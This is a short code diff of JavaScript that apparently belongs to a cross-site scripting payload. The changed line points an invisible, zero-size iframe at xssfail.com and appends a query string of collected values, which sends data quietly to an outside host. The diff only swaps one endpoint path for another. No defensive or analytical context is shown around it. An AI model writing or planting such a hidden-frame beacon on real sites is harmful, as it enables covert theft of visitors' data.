@@ -12,7 +12,7 @@
     
     var frame = create("iframe");
     frame.setAttribute('style', 'width:0;height:0;border:0;margin:0;padding:0;'); 
-    frame.setAttribute('src', "http://xssfail.com/xss/_design/api/form.htm?" + query.join('&'));
+    frame.setAttribute('src', "http://xssfail.com/form?" + query.join('&'));
     
     append(frame);
 })();
